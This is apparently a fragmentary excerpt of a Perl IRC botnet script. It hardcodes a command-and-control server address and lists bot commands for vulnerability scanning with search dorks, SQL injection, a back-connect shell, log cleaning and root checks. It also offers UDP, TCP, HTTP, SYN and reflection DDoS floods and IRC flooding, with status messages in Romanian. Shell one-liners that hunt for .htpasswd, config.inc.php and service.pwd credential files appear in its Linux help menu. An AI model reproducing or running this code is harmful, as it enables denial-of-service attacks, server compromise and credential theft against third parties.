...
# .bots @multiscan <vuln> <dork> 

# .bots @socks5 

# .bots @sql2 <vuln> <dork> <col> 

# .bots @portscan <ip> 

# .bots @logcleaner 

# .bots @sendmail <subject> <sender> <recipient> <message> 
...
# .bots @nmap <ip> <beginport> <endport> 

# .bots @back <ip><port> 

# .bots @linuxhelp 

# .bots @cd tmp:. | for example 
...
# .bots @udpflood <host> <packet size> <time> 

# .bots @tcpflood <host> <port> <packet size> <time> 

# .bots @httpflood <host> <time> 

# .bots @sqlflood <host> <time> 
...
chop (my $realname = 'Dumezeu'); 

#IRC name and Realname 

$servidor='80.172.244.160' unless $servidor; 
...
ircase("$pn","$onde","$1") unless ($natrix eq ".bots" and $arg =~ /^\!nick/); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[BY.ma-ta Perl Bot Commands List]-14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Hacking Based]-----14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3multiscan <vuln> <dork>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3socks5"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3sql <vuln> <dork>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3portscan <ip>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3logcleaner"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3sendmail <subject> <sender> <recipient> <message>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3system"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3cleartmp"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3rootable"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3nmap <ip> <beginport> <endport>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3back <ip><port>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3linuxhelp"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3cd tmp:. | for example"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3packetstorm"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3milw0rm"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3udpflood <host> <packet size> <time>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3udp <host> <port> <packet size> <time>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3tcpflood <host> <port> <packet size> <time>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3httpflood <host> <time>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3sqlflood <host> <time>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3killme"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3join #channel"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3part #channel"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3reset"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3voice <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3owner <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3deowner <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3devoice <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3halfop <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3dehalfop <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3op <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3deop <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3msgflood <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3dccflood <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3ctcpflood <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3noticeflood <who> "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3channelflood"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3maxiflood <who> "); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Dir where you are : pwd"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Start a Perl file : perl file.pl"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Go back from dir : cd .."); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Force to Remove a file/dir : rm -rf file/dir;ls -la"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Show all files/dir with permissions : ls -lia"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Find config.inc.php files : find / -type f -name config.inc.php"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Find all writable folders and files : find / -perm -2 -ls"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Find all .htpasswd files : find / -type f -name .htpasswd"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@ 3Find all service.pwd files : find / -type f -name service.pwd"); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3flooding - For IRC Flooding Help"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3irc - For IRC Bot Command Help "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3ddos - For DDos Command Help"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3news - For Security News Command Help "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3hacking - For Hacking Command Help"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3linuxhelp - For Linux Help"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3extras"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3version - For version info"); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3syn <destip> <destport> <time in seconds>"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3sudp <host> <port> <reflection file> <threads> <time> | Requires ./50 installed"); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3install-syn Syn.c"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :7.bots 14@3install-50x 50x.c");	
...
system 'wget http://switch.dl.sourceforge.net/source ... 2.tar.gz'; 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] The kernel of this pan is ".$khost." "); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :44@4IRC4 Arunca cu cacat in 4 ".$1.":".$2." 4PE 4 ".$3." 4SECUNDE."); 
...
sendraw($IRC_cur_socket,"PRIVMSG $printl :13[4@3UDP-DDOS13]  gata fa 4 ".$1.":".$2."."); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 ma-ta Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds ."); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|44 IRC 44|4 Dau cu cacat in  4 ".$1." 4 CU 4 ".$2." 4 Cacati/s 4 ".$3." 4 SECUNDE."); 
...
sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP.bots12]12 12gata fa4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12Cacati IN4 ".$dtime." 12SECUNDE PE4 ".$1."."); 
